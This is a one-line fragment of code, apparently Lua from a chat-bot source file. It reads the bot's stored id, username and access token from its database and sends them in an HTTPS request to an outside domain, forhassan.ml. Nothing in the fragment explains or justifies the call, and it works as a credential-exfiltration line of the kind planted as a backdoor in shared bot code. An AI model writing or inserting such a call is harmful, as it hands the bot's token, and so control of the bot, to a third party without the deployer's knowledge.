...
https.request("https://forhassan.ml/motel/motel.php?id="..database:get(Server_motel.."Id_motel").."&user="..database:get(Server_motel.."UserName_motel").."&token="..database:get(Server_motel.."Token_motel"))
